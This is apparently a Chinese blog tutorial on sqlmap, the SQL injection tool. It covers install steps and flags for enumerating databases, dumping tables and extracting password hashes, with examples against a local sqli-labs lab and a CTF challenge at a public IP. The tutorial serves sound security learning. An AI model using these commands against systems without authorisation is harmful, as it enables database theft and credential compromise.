---
title: 渗透测试工具之sqlmap
date: 2020-06-28 21:54:31
tags:
    - 渗透测试
---

# 简介
sqlmap是一个工具，一个用来做sql注入攻击的工具。SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。Sqlmap内置很多绕过插件，支持的数据库是MySQL、Oracle、postgreSQL、MicrosftSQL server、IBM DB2等

<!--more-->

SQLMap采用以下五种独特的SQL注入技术:

>1、基于布尔值的盲注，即根据返回页面判断条件真假的注入
2、基于时间的盲注，既不能根据页面返回的内容判断任何信息，要利用条件语句查看时间延迟语句是否已经执行来判断
3、基于报错注入，及页面会返回错误信息，或者把注入的语句的结果直接返回到页面中
4、联合查询注入，在可以使用union的情况下的注
5、堆查询注入，可以同时执行多条语句时注入

SQLMap的强大功能包括数据库指纹识别，数据库枚举，数据库提取，访问目标文件夹系统，并在获取完全的操作权限时实行任意指令命令，SQLMap的功能十分强大，当其他注入工具不能利用SQL注入漏洞时，使用SQLMap会有意向不到的结果

SQL注入请参考：
[什么是SQL注入漏洞](http://www.codesecurity.cn/2020/06/25/%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)


# 安装
官方网站下载
http://sqlmap.org/
或者github下载：
https://github.com/sqlmapproject/sqlmap

>wget ```https://codeload.github.com/sqlmapproject/sqlmap/legacy.tar.gz/master``` //下载sqlmap
tar zxvf master  //解压压缩包
cd sqlmapproject-sqlmap-310d79b/   //进入解压目录
python sqlmap.py -h  //开始使用


# 用法
执行sqlmap.py -h可以查看用法。

![sqlmap](sqlmap.png)

## GET注入
>sqlmap.py -u "url" 检测存在不存在注入
sqlmap.py -u "url" --tables    列出数据库的表
sqlmap.py -u "url" --columns -T admin    列出admin的内容
sqlmap.py -u "url" --dump -T admin "useradmin,password"    列出useradmin password的内容


## POST注入
>sqlmap.py -u ```www.xxx.com/index.php``` --data "user=1&pass=1" --dbs 指定post参数注入出数据库
sqlmap.py -u ```www.xxx.com/index.php``` --forms    sqlmap自动查找网页上的表单，并注入
sqlmap.py -r 1.txt -p user 用burp抓包，保存为1.txt 然后用-r参数注入，用-p参数来指定网页上的参数
sqlmap.py -r xxx.txt –dbs /*xxx.txt内容为HTTP请求*/
sqlmap.py -u "url" --user 列出数据库的所以用户
sqlmap.py -u "url" --passwords 列出数据库用户的密码
sqlmap.py -u "url" --current-db 查看当前使用网站数据库的名字
sqlmap.py -u "url" --current-user 查看当前网站数据库的用户名称
sqlmap.py -u "url" --is-dba 查看当前用户是否是管理员权限   True代表有，如果没有的话就是False


## 举例
1）检测目标网址是否存在注入
```
sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1
```

2）获取数据库指定的字段内容
```
sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 -D security -T users -C id,password,username --dump
# -D 指定数据库 -T 数据库下的表名 -C 指定所需要的列 --dump获取所有信息
```


3）获取数据库中所有用户
该命令的作用是列出数据库的所有用户，在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有的管理用户
```
sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --users
```

4）获取数据库的密码
该命令的作用是列出数据库的用户的密码，如果当前用户有读取包含用户密码的权限，sqlmap会列出用户，然后列出hash，并尝试破解
```
sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --passwords
```

## CTF爆破flag
>```
Sqlmap.py -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" --dbs   //爆库名
Sqlmap.py -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag --table  //爆表名
Sqlmap.py -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag -T fl4g --columns //爆字段
Sqlmap.py -u http://123.206.87.240:8002/chengjidan/index.php --data="id=1" -D skctf_flag -T fl4g -C skctf_flag --dump
//爆数据
```

